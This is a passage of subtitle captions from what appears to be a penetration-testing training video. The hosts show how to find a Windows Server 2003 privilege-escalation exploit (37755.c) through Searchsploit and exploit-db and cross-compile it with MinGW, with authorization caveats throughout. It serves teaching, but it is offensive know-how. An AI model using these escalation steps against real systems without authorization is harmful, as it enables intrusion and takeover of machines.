access,\nbut it's not administrative shell access.\n\n18\n00:00:57.180 --> 00:00:59.880\nIt's running as a service account or\nthings of that nature.\n\n19\n00:00:59.880 --> 00:01:03.870\nThese things that Mike was alluding\nto as he introduced the show.\n\n20\n00:01:03.870 --> 00:01:05.060\nCuz that's what happens a lot.\n\n21\n00:01:05.060 --> 00:01:10.150\nYou might have exploited something, but\nthe user account that you got the password\n\n22\n00:01:10.150 --> 00:01:15.050\nfor, or you ran a buffer overflow and\nyou exploited a mail\n\n23\n00:01:15.050 --> 00:01:19.130\nserver with a mail account, and you're\nrunning as mail account one or something.\n\n24\n00:01:19.130 --> 00:01:20.180\nIt's not administrative privileges.\n\n25\n00:01:20.180 --> 00:01:24.534\n&gt;&gt; Yeah, and you might get lucky and\nsome administrator gave domain\n\n26\n00:01:24.534 --> 00:01:28.190\nadmin rights to the service,\nor something like that.\n\n27\n00:01:28.190 --> 00:01:31.965\nBut odds are, they've done\na little bit of best practices.\n\n28\n00:01:31.965 --> 00:01:35.080\nThey've made an account, standard user,\nand that service runs into that.\n\n29\n00:01:35.080 --> 00:01:38.233\nAnd they'll give whatever permissions\nthey need to for that service to run.\n\n30\n00:01:38.233 --> 00:01:40.345\nThey're not thinking about you\nbreaking into the machine and\n\n31\n00:01:40.345 --> 00:01:41.609\nhow you're gonna need root access.\n\n32\n00:01:41.609 --> 00:01:44.290\nSo somehow we've gotta\nbump our privileges up.\n\n33\n00:01:44.290 --> 00:01:45.018\n&gt;&gt; That's exactly right.\n\n34\n00:01:45.018 --> 00:01:47.437\nAnd that's what we're\ngonna talk about today so\n\n35\n00:01:47.437 --> 00:01:51.040\nthat we can reach those upper echelons and\ntake control, full control.\n\n36\n00:01:51.040 --> 00:01:53.693\nCuz that's what it's all about,\nfull control of these systems.\n\n37\n00:01:53.693 --> 00:01:57.720\nSo, today is obviously all about\nWindows and how to do that there.\n\n38\n00:01:57.720 --> 00:02:00.590\nWe're gonna do a couple of different\nways in which we can do this.\n\n39\n00:02:00.590 --> 00:02:03.800\nThe first way in which we're gonna\nstart off with is actually finding\n\n40\n00:02:03.800 --> 00:02:08.510\na privilege escalation exploit\nout in the wild, using it so\n\n41\n00:02:08.510 --> 00:02:11.230\nthat we might escalate our privileges.\n\n42\n00:02:11.230 --> 00:02:12.200\nHey, how about that?\n\n43\n00:02:12.200 --> 00:02:14.420\n&gt;&gt; I like that.\nWe found an exploit to get into the box.\n\n44\n00:02:14.420 --> 00:02:17.354\nWe find another exploit to\nescalate our privileges.\n\n45\n00:02:17.354 --> 00:02:17.952\nWhat could be better?\n\n46\n00:02:17.952 --> 00:02:20.770\n&gt;&gt; Yeah,\nwe don't have to do all the heavy lifting.\n\n47\n00:02:20.770 --> 00:02:23.532\nBut, be warned,\nthere's going to be some heavy lifting.\n\n48\n00:02:23.532 --> 00:02:25.367\n&gt;&gt; [LAUGH]\n&gt;&gt; There's gonna be some very heavy\n\n49\n00:02:25.367 --> 00:02:26.512\nlifting, my goodness.\n\n50\n00:02:26.512 --> 00:02:28.815\n&gt;&gt; [LAUGH]\n&gt;&gt; Caveats for the day, remember,\n\n51\n00:02:28.815 --> 00:02:31.700\nwe always start of with our don't do\nthis for a nefarious things, right.\n\n52\n00:02:31.700 --> 00:02:35.501\nNot good, bad, bad, [SOUND] smack,\nsmack, smack, no, no no.\n\n53\n00:02:35.501 --> 00:02:38.403\nOnly if you have authorized\naccess to try these things or\n\n54\n00:02:38.403 --> 00:02:40.450\nif the machines are owned by yourself.\n\n55\n00:02:41.510 --> 00:02:44.460\nAnd make sure this is in\na sandboxed environment because,\n\n56\n00:02:44.460 --> 00:02:46.940\nwell, there's a vulnerability there\n\n57\n00:02:46.940 --> 00:02:49.770\nthat you don't want the hackers of\nthe world uniting against, right?\n\n58\n00:02:49.770 --> 00:02:51.590\nSo, make sure you do that.\n\n59\n00:02:51.590 --> 00:02:57.265\nAnd another caveat for this specific\nshow is that when you find exploit code,\n\n60\n00:02:57.265 --> 00:03:03.747\nokay, you gotta remember, these are called\nproof of concept codes typically, POCs.\n\n61\n00:03:03.747 --> 00:03:07.153\nWhen you find these out in the wild,\na, you need to verify,\n\n62\n00:03:07.153 --> 00:03:11.280\nby looking at that code,\nthat it's not something malicious, right?\n\n63\n00:03:11.280 --> 00:03:13.610\nBecause I can put a code out\nin an exploit database and\n\n64\n00:03:13.610 --> 00:03:18.615\nsay, hey this exploits Windows machines,\nyour Windows machine.\n\n65\n00:03:18.615 --> 00:03:22.610\n[LAUGH] So when the shell code fires up,\nyou're pumping a shell to me and\n\n66\n00:03:22.610 --> 00:03:24.570\nyou're like, hmm,\nI wonder why I'm not getting shell,\n\n67\n00:03:24.570 --> 00:03:27.040\nI guess I just don't understand\nthis exploit very well.\n\n68\n00:03:27.040 --> 00:03:30.100\nSo be very careful on your source,\nall right?\n\n69\n00:03:30.100 --> 00:03:31.840\nSo wherever you get these exploits from,\n\n70\n00:03:31.840 --> 00:03:34.510\njust don't willy nilly go out\nin the world and grab one.\n\n71\n00:03:34.510 --> 00:03:40.450\nOnly from trusted sources should you\ngrab pre-made exploits from, okay?\n\n72\n00:03:40.450 --> 00:03:44.583\nAnd also you were to get some of that\nstuff from, if you're running Kali Linux\n\n73\n00:03:44.583 --> 00:03:48.734\nit's easy, or if you access to the\nInternet, you can get it there, as well.\n\n74\n00:03:48.734 --> 00:03:51.229\nI'll show you a resource\nthat kinda ties into that.\n\n75\n00:03:52.730 --> 00:03:56.912\nAnd then, the problem comes in to, you\ngotta remember, when they compiled that\n\n76\n00:03:56.912 --> 00:04:00.847\ncode, when they ran it, when they wrote\nit, it was for a specific operating\n\n77\n00:04:00.847 --> 00:04:05.680\nsystem, and off a specific architecture,\nwhich may be different than yours.\n\n78\n00:04:05.680 --> 00:04:09.180\nSo, you might get some compilation errors,\nyou might have to go in and\n\n79\n00:04:09.180 --> 00:04:12.290\nchange things,\nput in different shell code.\n\n80\n00:04:12.290 --> 00:04:14.400\nGood thing is, we know how to\ncreate our own shell code, right?\n\n81\n00:04:14.400 --> 00:04:15.765\nSo that shouldn't be too difficult.\n\n82\n00:04:15.765 --> 00:04:17.194\nYou're gonna have to go in and\nchange the IP addresses.\n\n83\n00:04:17.194 --> 00:04:20.110\nYou're gonna have to do some finagling,\nusually.\n\n84\n00:04:20.110 --> 00:04:21.081\nMe and Mike were talking about this.\n\n85\n00:04:21.081 --> 00:04:23.682\n&gt;&gt; [LAUGH]\n&gt;&gt; We've only ever found one piece of\n\n86\n00:04:23.682 --> 00:04:27.350\nexploit code where,\nout of the box, it ran and worked.\n\n87\n00:04:27.350 --> 00:04:29.940\n&gt;&gt; We debated,\nI think they do it on purpose sometimes.\n\n88\n00:04:29.940 --> 00:04:30.455\n&gt;&gt; [LAUGH] Yeah.\n\n89\n00:04:30.455 --> 00:04:33.700\n&gt;&gt; Maybe to keep script kiddies and things\nlike that from finding the exploits and\n\n90\n00:04:33.700 --> 00:04:36.070\njust being able to use\nthem out of the box.\n\n91\n00:04:36.070 --> 00:04:38.540\nCuz I'm like,\nthe guy that wrote this was brilliant.\n\n92\n00:04:38.540 --> 00:04:39.770\nThere is no way,\n&gt;&gt; [LAUGH]\n\n93\n00:04:39.770 --> 00:04:41.630\n&gt;&gt; He used the wrong keyword here\n\n94\n00:04:41.630 --> 00:04:43.640\nthat's preventing this\nthing from compiling.\n\n95\n00:04:43.640 --> 00:04:47.170\nSo sometimes I think either the author,\nor the site that's hosting them,\n\n96\n00:04:47.170 --> 00:04:48.870\nand this is just theory, just me guessing,\n\n97\n00:04:48.870 --> 00:04:51.750\nbut sometimes I think they\ntweak them a little bit.\n\n98\n00:04:51.750 --> 00:04:53.400\nSo you have to know what\nyou're doing to use them.\n\n99\n00:04:53.400 --> 00:04:57.140\n&gt;&gt; Yeah, just enough to where if you're\nnot a bit of a programmer, at least in\n\n100\n00:04:57.140 --> 00:05:00.670\nsome way, you don't have some programming\nknowledge, it's not gonna work.\n\n101\n00:05:00.670 --> 00:05:02.073\nAnd I can attest to this fact.\n\n102\n00:05:02.073 --> 00:05:02.688\n&gt;&gt; [LAUGH]\n&gt;&gt; Because I\n\n103\n00:05:02.688 --> 00:05:07.080\nactually had to get Justin Dennison,\nour of our development gurus here.\n\n104\n00:05:08.210 --> 00:05:12.220\nHe did our Python show,\nhe's working on JavaScripting right now.\n\n105\n00:05:12.220 --> 00:05:18.280\nSuper smart guy, and he was sitting there,\nhmm, what's going on?\n\n106\n00:05:18.280 --> 00:05:21.590\nAnd he had to look at it, and\nI'm like, okay, so I'm not crazy here.\n\n107\n00:05:21.590 --> 00:05:23.910\nI'm not the only one that's having\na difficult time figuring it out.\n\n108\n00:05:23.910 --> 00:05:26.160\nSo it can be very frustrating.\n\n109\n00:05:26.160 --> 00:05:28.490\nStick with it, use Google,\nit's your friend.\n\n110\n00:05:28.490 --> 00:05:30.966\nAnd as Adam says,\nit's the Oracle of the internet, and\n\n111\n00:05:30.966 --> 00:05:32.840\nhopefully that won't let you down.\n\n112\n00:05:32.840 --> 00:05:35.580\nIf you have resources,\nyou know a developer, call them in,\n\n113\n00:05:35.580 --> 00:05:37.804\nhey I need your help with this,\nI'm not seeing.\n\n114\n00:05:37.804 --> 00:05:40.010\nSo, it can be very frustrating.\n\n115\n00:05:40.010 --> 00:05:41.400\nBut, the code does exist.\n\n116\n00:05:41.400 --> 00:05:44.420\nAll you have to do is know how to modify\nit correctly if it doesn't compile\n\n117\n00:05:44.420 --> 00:05:48.300\ncorrectly right out of the gate,\nchange the parameters that are necessary.\n\n118\n00:05:48.300 --> 00:05:50.480\nAnd then you should be off and running.\n\n119\n00:05:50.480 --> 00:05:51.790\nHopefully, fingers crossed, right?\n\n120\n00:05:51.790 --> 00:05:53.460\nThat's always the case.\n\n121\n00:05:53.460 --> 00:05:55.600\n&gt;&gt; All right Daniel, so show us where\nwe can get some of these exploits.\n\n122\n00:05:55.600 --> 00:05:56.700\n&gt;&gt; All right, let's do that.\n\n123\n00:05:56.700 --> 00:05:57.859\nLet's jump to my machine.\n\n124\n00:05:57.859 --> 00:05:59.520\nThere's a couple ways you can do this.\n\n125\n00:05:59.520 --> 00:06:04.630\nOne of them is using,\nKali Linux is basically developed by\n\n126\n00:06:04.630 --> 00:06:09.510\na entity called Offensive Security,\nthey developed Kali Linux.\n\n127\n00:06:09.510 --> 00:06:13.580\nI love Offensive Security, they have\ngreat certifications for this very thing.\n\n128\n00:06:13.580 --> 00:06:15.850\nThey have great information\non their website.\n\n129\n00:06:15.850 --> 00:06:17.390\nIt's a wonderful, wonderful place.\n\n130\n00:06:17.390 --> 00:06:18.320\nThat's where we get Kali Linux.\n\n131\n00:06:18.320 --> 00:06:23.610\nAnd because they do that, they put their\ndatabase of exploits in the machine.\n\n132\n00:06:23.610 --> 00:06:27.183\nSo all you have to do is run this cool\nlittle program called Searchsploit.\n\n133\n00:06:29.229 --> 00:06:32.250\nLike that, and\nthen give it something to look for.\n\n134\n00:06:32.250 --> 00:06:36.609\nSo if I wanted to say, Windows,\n\n135\n00:06:36.609 --> 00:06:41.136\nwe'll say 2003.priv esc.\n\n136\n00:06:41.136 --> 00:06:45.300\nThere you go, I'm seeing some privilege\nescalation exploits right there.\n\n137\n00:06:45.300 --> 00:06:47.600\nCuz that's what I looked for,\nprivilege and escalation.\n\n138\n00:06:47.600 --> 00:06:52.475\nAnd over here is the different codes,\nand they give them a numbering system.\n\n139\n00:06:52.475 --> 00:06:54.659\nFor whatever reason,\nthat's what they went with.\n\n140\n00:06:54.659 --> 00:06:58.550\nAs you can see some of them are .c,\nsome of them are .py for python.\n\n141\n00:06:58.550 --> 00:07:01.130\nSo a lot of c code and a lot of python,\nsome of them are text bases.\n\n142\n00:07:01.130 --> 00:07:04.960\nMaybe you have to save it as a c file or\nsomething like that.\n\n143\n00:07:04.960 --> 00:07:07.170\nYou have to look at them\nto know what they are.\n\n144\n00:07:07.170 --> 00:07:12.750\nAnd you can see the path, right here, it's\nsaved in user/share/ exploitdb/platforms.\n\n145\n00:07:12.750 --> 00:07:16.150\nThis is under Windows, denial of service,\nthat's a denial of service attack,\n\n146\n00:07:16.150 --> 00:07:18.160\nI don't really care for that.\n\n147\n00:07:18.160 --> 00:07:22.765\nBut this is a local, which means that you\nhave to run it on the machine itself.\n\n148\n00:07:22.765 --> 00:07:25.140\nWe'd have to use our FTPing abilities,\nmaybe,\n\n149\n00:07:25.140 --> 00:07:30.670\nto upload that to our vulnerable server so\nthat we can escalate our privileges.\n\n150\n00:07:30.670 --> 00:07:34.340\nAnd of course, that's after\nwe've compiled it and it's run.\n\n151\n00:07:34.340 --> 00:07:36.230\nAll right, so\nthat's one place to get them.\n\n152\n00:07:36.230 --> 00:07:37.879\nThis is a very nice thing.\n\n153\n00:07:37.879 --> 00:07:39.880\nYou'll probably use both\nof these resources.\n\n154\n00:07:39.880 --> 00:07:44.603\nThe other place is actually from\nOffensive Security, from exploit-db.\n\n155\n00:07:44.603 --> 00:07:49.416\nSo let's, let me open up a browser here,\nit's my 2003 server running,\n\n156\n00:07:49.416 --> 00:07:51.797\nbut I just need Firefox or something.\n\n157\n00:07:51.797 --> 00:07:57.262\nAnd just go to www.exploit-db.com.\n\n158\n00:07:57.262 --> 00:07:59.594\nAnd there you go,\nthere's is a database archive right there,\n\n159\n00:07:59.594 --> 00:08:00.835\nstaring at you right in the face.\n\n160\n00:08:00.835 --> 00:08:03.275\nFree for all to use.\n\n161\n00:08:03.275 --> 00:08:06.884\nThey do recommend that you go download\nKali Linux and run that cuz it's\n\n162\n00:08:06.884 --> 00:08:11.042\na lot easier than using their side because\nI wanna make sure that you are not a bot,\n\n163\n00:08:11.042 --> 00:08:14.280\nsome sort of automated program search for\nexploits.\n\n164\n00:08:14.280 --> 00:08:17.421\nThere's some of the remote\nexploits category,\n\n165\n00:08:17.421 --> 00:08:22.566\nincludes exploits from web services,\nweb applications, they break it down.\n\n166\n00:08:22.566 --> 00:08:28.026\nI can come over here and hit Search,\ngo to the Search screen,\n\n167\n00:08:28.026 --> 00:08:31.363\nhit Windows, 2003, priv esc.\n\n168\n00:08:31.363 --> 00:08:33.150\nSay I am not a robot.\n\n169\n00:08:34.590 --> 00:08:35.487\nAnd search.\n\n170\n00:08:35.487 --> 00:08:39.345\nAnd that can get extremely annoying,\nbut they do it for good purposes.\n\n171\n00:08:39.345 --> 00:08:40.172\n&gt;&gt; Yes.\n\n172\n00:08:40.172 --> 00:08:42.610\nAnd there you go, there's the exploits.\n\n173\n00:08:42.610 --> 00:08:45.805\nI do kind of like to do side\nby side with Searchsploit,\n\n174\n00:08:45.805 --> 00:08:49.071\nfind the ones I'm looking for\nand then jump on the DB and\n\n175\n00:08:49.071 --> 00:08:50.780\njust put the URL in-\n&gt;&gt; Mm-hm.\n\n176\n00:08:50.780 --> 00:08:53.540\n&gt;&gt; So I can see it and\nit's a nicer format in the web.\n\n177\n00:08:53.540 --> 00:08:54.278\nIt is for me.\n\n178\n00:08:54.278 --> 00:08:54.800\n&gt;&gt; Yup.\n\n179\n00:08:54.800 --> 00:08:56.074\n&gt;&gt; So there you go.\n\n180\n00:08:56.074 --> 00:08:58.862\nThere are some places you can\nget exploit code from, and\n\n181\n00:08:58.862 --> 00:09:02.600\nthey're should be relatively safe,\nstill check them.\n\n182\n00:09:02.600 --> 00:09:04.567\nAlways change out your shell code,\nthings of that.\n\n183\n00:09:04.567 --> 00:09:06.908\nSo that it's,\nI mean that's just a simple thing to do.\n\n184\n00:09:06.908 --> 00:09:11.097\nIf there's shell code in there, generate\nyour own shell code using an SFM and\n\n185\n00:09:11.097 --> 00:09:13.810\npop it into your script, okay?\n\n186\n00:09:13.810 --> 00:09:16.600\nSo now that we know where to get them,\n\n187\n00:09:16.600 --> 00:09:20.294\nlet's take a look at some\nof them that came back.\n\n188\n00:09:20.294 --> 00:09:25.156\nAnd I will tell you, I went through\njust about, I think every single one\n\n189\n00:09:25.156 --> 00:09:29.776\nof these exploits and worked with them,\ntrying to get them to run for\n\n190\n00:09:29.776 --> 00:09:34.583\nour purposes before, obviously today,\nthe show is being recorded.\n\n191\n00:09:34.583 --> 00:09:37.090\n&gt;&gt; Let me guess,\nit was the last one you tried.\n\n192\n00:09:37.090 --> 00:09:38.883\n&gt;&gt; It was the very last one I tried,\nright?\n\n193\n00:09:38.883 --> 00:09:40.053\n&gt;&gt; [LAUGH]\n&gt;&gt; It's always-\n\n194\n00:09:40.053 --> 00:09:40.953\n&gt;&gt; And it's always.\n\n195\n00:09:40.953 --> 00:09:43.698\n&gt;&gt; And of course it's the last one you\ntry because you stop after you find one\n\n196\n00:09:43.698 --> 00:09:44.206\nthat works.\n\n197\n00:09:44.206 --> 00:09:45.015\n&gt;&gt; [LAUGH]\n&gt;&gt; So,\n\n198\n00:09:45.015 --> 00:09:48.450\nright there's is a funny little\nnugget of wisdom for you.\n\n199\n00:09:48.450 --> 00:09:51.552\nBut not only was it the last one I tried,\nbut it was the last one on the list.\n\n200\n00:09:51.552 --> 00:09:52.193\n&gt;&gt; Yes, there you go.\n&gt;&gt; That's which\n\n201\n00:09:52.193 --> 00:09:52.734\nwas what Mike was meaning, right?\n\n202\n00:09:52.734 --> 00:09:53.784\n&gt;&gt; That was what I was trying to say.\n\n203\n00:09:53.784 --> 00:09:55.665\nIt was the last one on the list.\n\n204\n00:09:55.665 --> 00:09:57.552\nCuz I start at the bottom\nof every list I look at.\n\n205\n00:09:57.552 --> 00:09:59.010\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know about you, right?\n\n206\n00:09:59.010 --> 00:10:03.397\nBut, well it was a lot of pain and\nsuffering, but I do it for you, right?\n\n207\n00:10:03.397 --> 00:10:05.390\nI do it for you so\nyou could see cool stuff.\n\n208\n00:10:05.390 --> 00:10:07.040\n&gt;&gt; And that's what you have to go through-\n&gt;&gt; Yeah.\n\n209\n00:10:07.040 --> 00:10:08.668\n&gt;&gt; As a penetration tester,\n\n210\n00:10:08.668 --> 00:10:12.200\nyou have to try them all until\nyou find one that works.\n\n211\n00:10:12.200 --> 00:10:17.514\n&gt;&gt; That's exactly right, it's just part\nof the job, it's gonna be frustrating.\n\n212\n00:10:17.514 --> 00:10:21.950\nI don't want you to think Daniel just\ntypes the stuff and it goes easy.\n\n213\n00:10:21.950 --> 00:10:24.546\nIt doesn't.\nIt does on the show because otherwise\n\n214\n00:10:24.546 --> 00:10:27.724\nthe time constraints would\nkeep us from showing you.\n\n215\n00:10:27.724 --> 00:10:29.010\nThis takes me hours, right?\n\n216\n00:10:29.010 --> 00:10:31.793\nI have to go through\nthe same pains that you do.\n\n217\n00:10:31.793 --> 00:10:33.201\nThis isn't compiling, why?\n\n218\n00:10:33.201 --> 00:10:34.150\nGoogle search the air.\n\n219\n00:10:34.150 --> 00:10:38.761\nOkay, this guy says this, this guy says\nthat, this girl says such and such.\n\n220\n00:10:38.761 --> 00:10:39.520\nLet me try that.\n\n221\n00:10:39.520 --> 00:10:42.649\nOkay I got rid of some compilation\nerrors but I'm still getting this one,\n\n222\n00:10:42.649 --> 00:10:43.668\nwhy is that happening?\n\n223\n00:10:43.668 --> 00:10:45.060\nAnd it's just not working.\n\n224\n00:10:45.060 --> 00:10:46.877\nNo completion errors and\nit still didn't work.\n\n225\n00:10:46.877 --> 00:10:50.110\nFrustration, frustration, continue to try.\n\n226\n00:10:50.110 --> 00:10:53.877\nThat's what all this about, you're just\ngonna keep trying things over and over and\n\n227\n00:10:53.877 --> 00:10:54.470\nover again.\n\n228\n00:10:54.470 --> 00:10:56.386\nYou just have to stick with it,\n\n229\n00:10:56.386 --> 00:10:58.489\nyou just have to not give up-\n&gt;&gt; Mm-hm.\n\n230\n00:10:58.489 --> 00:11:00.568\n&gt;&gt; And eventually, and man when it does,\n\n231\n00:11:00.568 --> 00:11:04.033\nwhen you bust to that door with\nthat thing that you didn't think,\n\n232\n00:11:04.033 --> 00:11:07.750\nthis is gonna work, I will just try but\nwhat the heck, and it happens?\n\n233\n00:11:07.750 --> 00:11:09.631\nElation.\n\n234\n00:11:09.631 --> 00:11:11.887\nIt's addictive,\nI'll be honest with you, it's very fun.\n\n235\n00:11:11.887 --> 00:11:13.388\n&gt;&gt; [LAUGH]\n&gt;&gt; Okay, so\n\n236\n00:11:13.388 --> 00:11:15.737\nwhich one was it that helped me out?\n\n237\n00:11:15.737 --> 00:11:19.235\nThere's a lot of good one, I actually did\nfind one that did deny our service server.\n\n238\n00:11:19.235 --> 00:11:19.860\n&gt;&gt; Hmm.\n\n239\n00:11:19.860 --> 00:11:23.424\n&gt;&gt; So if I wanted to do that instead it\nwas a privilege escalation attack, but\n\n240\n00:11:23.424 --> 00:11:26.138\nall it did for me was DOS the server,\nI mean blue screen.\n\n241\n00:11:26.138 --> 00:11:26.864\nIt was done and it rebooted.\n\n242\n00:11:26.864 --> 00:11:28.200\n&gt;&gt; Wow.\n&gt;&gt; Yeah.\n\n243\n00:11:28.200 --> 00:11:33.040\nThat was this one I think,\ndouble free memory right there.\n\n244\n00:11:33.040 --> 00:11:37.256\nSo I compiled it, got it to work and\ndownloaded it to the server,\n\n245\n00:11:37.256 --> 00:11:41.174\nfired it off and\nall of a sudden it was like, hello, hello.\n\n246\n00:11:41.174 --> 00:11:43.466\nI look and run the server,\njust blue screen sitting there.\n\n247\n00:11:43.466 --> 00:11:45.480\n&gt;&gt; [LAUGH]\n&gt;&gt; Then it rebooted.\n\n248\n00:11:45.480 --> 00:11:47.248\nBut this one was the one that worked for\nme.\n\n249\n00:11:47.248 --> 00:11:51.058\nThis guy 37755.C.\n\n250\n00:11:51.058 --> 00:11:58.175\nThis is Windows Server 2003\nSP2 TCPIPIOCTL privilege escalation.\n\n251\n00:11:58.175 --> 00:12:00.521\nLike I said I went through them all.\n\n252\n00:12:00.521 --> 00:12:05.040\nAs you saw before my 2003\nserver is over here running.\n\n253\n00:12:05.040 --> 00:12:10.338\nAnd let's set the stage for you,\nI have scanned it, I've enumerated it,\n\n254\n00:12:10.338 --> 00:12:15.065\nI have gained a user account and\npassword through whatever means.\n\n255\n00:12:15.065 --> 00:12:18.009\nWe're kinda fast forwarding through\nthat cuz we want to get to privilege\n\n256\n00:12:18.009 --> 00:12:21.483\nescalation, so we're assuming that I've\nalready gone through a lot of the headache\n\n257\n00:12:21.483 --> 00:12:22.990\nof getting into the box.\n\n258\n00:12:22.990 --> 00:12:25.500\nNow I need to escalate\nthe privileges that I have had,\n\n259\n00:12:25.500 --> 00:12:27.010\nbecause they're not administrative.\n\n260\n00:12:27.010 --> 00:12:32.321\nSo that's the stage we set,\nthere's our 2003 Server running.\n\n261\n00:12:32.321 --> 00:12:35.233\nAnd now, we're going to,\nI've RDPed into it.\n\n262\n00:12:35.233 --> 00:12:36.472\nHere's my RDP session.\n\n263\n00:12:36.472 --> 00:12:40.469\nRight here, hopefully that is,\nthat looks pretty good on the screen.\n\n264\n00:12:40.469 --> 00:12:42.473\nHopefully that's nice and big.\n\n265\n00:12:42.473 --> 00:12:44.290\nMike, you'll let me know if\nit's too small or anything?\n\n266\n00:12:44.290 --> 00:12:44.890\n&gt;&gt; I will.\n&gt;&gt; All right.\n\n267\n00:12:44.890 --> 00:12:49.359\nSo I'm just gonna log in,\nI'm a normal user, right?\n\n268\n00:12:49.359 --> 00:12:52.316\nJust any old person, I logged in.\n\n269\n00:12:52.316 --> 00:12:56.100\nMaybe this is, I don't know,\nterminal server or something like that.\n\n270\n00:12:56.100 --> 00:12:57.481\nWho knows?\n\n271\n00:12:57.481 --> 00:13:02.030\nBut I've got an RDP session, it allowed\nme to do that with an underling user.\n\n272\n00:13:02.030 --> 00:13:04.682\nSo now what I gotta do is\nI'm gonna jump over here.\n\n273\n00:13:04.682 --> 00:13:06.349\nNow that you've seen the stage, it's set.\n\n274\n00:13:06.349 --> 00:13:11.340\nI'm just gonna shrink that back down,\ncuz it's just kind of distracting.\n\n275\n00:13:11.340 --> 00:13:14.020\nI'll shrink this too.\n\n276\n00:13:14.020 --> 00:13:15.776\nWe need to compile that code.\n\n277\n00:13:15.776 --> 00:13:18.345\nOne way that you do it is just copy,\nmake a directory.\n\n278\n00:13:18.345 --> 00:13:23.088\nNotice I've created this directory\nPerlDesk, just copy that over to,\n\n279\n00:13:23.088 --> 00:13:26.520\nor create a directory, and\ncopy that exploit code.\n\n280\n00:13:26.520 --> 00:13:31.398\nSo just do a CP User Share Exploit, blah\nblah blah, all the way down to 37755c,\n\n281\n00:13:31.398 --> 00:13:34.857\nand if you do an LS here you'll\nnotice that I have done that.\n\n282\n00:13:34.857 --> 00:13:37.900\nThere it is.\nAnd now we gotta compile it.\n\n283\n00:13:37.900 --> 00:13:41.226\nNow this is a Windows-based exploit,\nnot Linux.\n\n284\n00:13:41.226 --> 00:13:43.682\nSo we need to use a Windows compiler.\n\n285\n00:13:43.682 --> 00:13:47.564\nA little guy called Ming, Ming W32.\n\n286\n00:13:47.564 --> 00:13:50.150\nIt's a very nice compiler,\nit's part of GC.\n\n287\n00:13:50.150 --> 00:13:52.640\nI don't know if it's GCC if they make it,\nbut\n\n288\n00:13:52.640 --> 00:13:57.450\nit works like GCC just for\nWindows-based executables.\n\n289\n00:13:57.450 --> 00:14:00.040\nSo what you gotta do is, if you say i686,\n\n290\n00:14:00.040 --> 00:14:04.660\ncuz that's the architecture running under,\nthere's a lot of different Ming\n\n291\n00:14:04.660 --> 00:14:08.378\ncommands depending on the architecture\nyou are working with.\n\n292\n00:14:08.378 --> 00:14:10.513\nSo you gotta play around with Ming.\n\n293\n00:14:12.064 --> 00:14:18.850\nAnd then _, it is mingw32, like so.\n\n294\n00:14:18.850 --> 00:14:25.308\nAnd then we do -gcc, cuz that's\nour c compiler, it's the C code.\n\n295\n00:14:25.308 --> 00:14:29.817\nThen we're going to give it\nthe file name which is 37755.c and\n\n296\n00:14:29.817 --> 00:14:32.880\nthen dash O for what we want to output.\n\n297\n00:14:32.880 --> 00:14:38.524\nNow I've already created this Net.exe,\nthat's what I named it,\n\n298\n00:14:38.524 --> 00:14:45.669\nbut I'll show you what it looks like when\nI do this, so I'll just call it Net2.exe.\n\n299\n00:14:45.669 --> 00:14:47.108\nAnd there you go.\n\n300\n00:14:47.108 --> 00:14:49.630\nAnd of course I get this whole\nlovely command not found.\n\n301\n00:14:49.630 --> 00:14:52.020\nWhat did I type incorrectly?\n\n302\n00:14:52.020 --> 00:14:53.350\nYeah.\n\n303\n00:14:53.350 --> 00:14:56.445\nI did type it incorrectly,\nI forgot one little,\n\n304\n00:14:56.445 --> 00:15:00.386\nmeaningful piece of information here,\nwhich is this w64.\n\n305\n00:15:00.386 --> 00:15:05.090\nSo it's basically like 32 and 64 bit\narchitecture command that I'm using.\n\n306\n00:15:05.090 --> 00:15:08.595\nSo if it's a 32 bit program,\nit'll compile.\n\n307\n00:15:08.595 --> 00:15:10.130\nIt's a 64-bit program, it'll compile.\n\n308\n00:15:10.130 --> 00:15:11.106\nAnd we like that.\n\n309\n00:15:11.106 --> 00:15:12.020\nSo dash, there we go.\n\n310\n00:15:12.020 --> 00:15:12.849\nThat's what the command should like that.\n\n311\n00:15:12.849 --> 00:15:14.259\n&gt;&gt; Wait,\nI think you gotta underscore there.\n\n312\n00:15:14.259 --> 00:15:15.428\n&gt;&gt; Underscore, thank you Michael.\n\n313\n00:15:15.428 --> 00:15:15.940\nThank you.\n\n314\n00:15:15.940 --> 00:15:17.013\nUnderscore is all over the place.\n\n315\n00:15:17.013 --> 00:15:18.992\n&gt;&gt; Or is it supposed to be a dash, though?\n\n316\n00:15:18.992 --> 00:15:19.850\nWhere is that?\n\n317\n00:15:19.850 --> 00:15:20.544\n&gt;&gt; Both of those?\n\n318\n00:15:20.544 --> 00:15:22.210\n&gt;&gt; Yeah, the GCC, yes.\n\n319\n00:15:22.210 --> 00:15:23.150\n&gt;&gt; Okay.\n\n320\n00:15:23.150 --> 00:15:25.619\n&gt;&gt; Or maybe, that's, they're not\nunderscores, they are dashes, that's my-\n\n321\n00:15:25.619 --> 00:15:26.495\n&gt;&gt; That's what I was thinking.\n\n322\n00:15:26.495 --> 00:15:27.390\n&gt;&gt; Yup.\n\n323\n00:15:27.390 --> 00:15:30.351\nI had dash right there,\nthis was also a problem.\n\n324\n00:15:30.351 --> 00:15:32.580\nEasy to do, just go back and fix it.\n\n325\n00:15:32.580 --> 00:15:36.350\nYou'll get an error just like we did and\nyou'll take a look and find the problem.\n\n326\n00:15:36.350 --> 00:15:39.573\nSo let's try that, there we go,\ncompile, no problem.\n\n327\n00:15:39.573 --> 00:15:41.740\nThe compile is no problem now, okay?\n\n328\n00:15:41.740 --> 00:15:44.138\n&gt;&gt; [LAUGH]\n&gt;&gt; Because I changed the stinking code.\n\n329\n00:15:44.138 --> 00:15:47.684\nThis gave me fits and\nI worked two hours on it with Justin.\n\n330\n00:15:47.684 --> 00:15:49.640\nLet me show you what the problem was.\n\n331\n00:15:49.640 --> 00:15:53.968\nIf I nano good old 3557.\n\n332\n00:15:53.968 --> 00:15:57.845\nWhat is it, 37755, 7755.c.\n\n333\n00:15:57.845 --> 00:16:03.138\nRight here at the top, here's the exploit\ncode Telling you what it works on,\n\n334\n00:16:03.138 --> 00:16:06.892\nsupport Windows 2003 SP2 X86, X86-64.\n\n335\n00:16:06.892 --> 00:16:09.292\nItanium, you name it, it worked on that.\n\n336\n00:16:09.292 --> 00:16:10.950\nWe tested it successfully.\n\n337\n00:16:10.950 --> 00:16:14.166\nLots of great notation.\n\n338\n00:16:14.166 --> 00:16:16.397\nThis person really did a great job.\n\n339\n00:16:16.397 --> 00:16:20.700\nExcept for one stinking thing was\nthat when you come down to right\n\n340\n00:16:20.700 --> 00:16:25.770\nat the start of this guy,\nthere's all the include 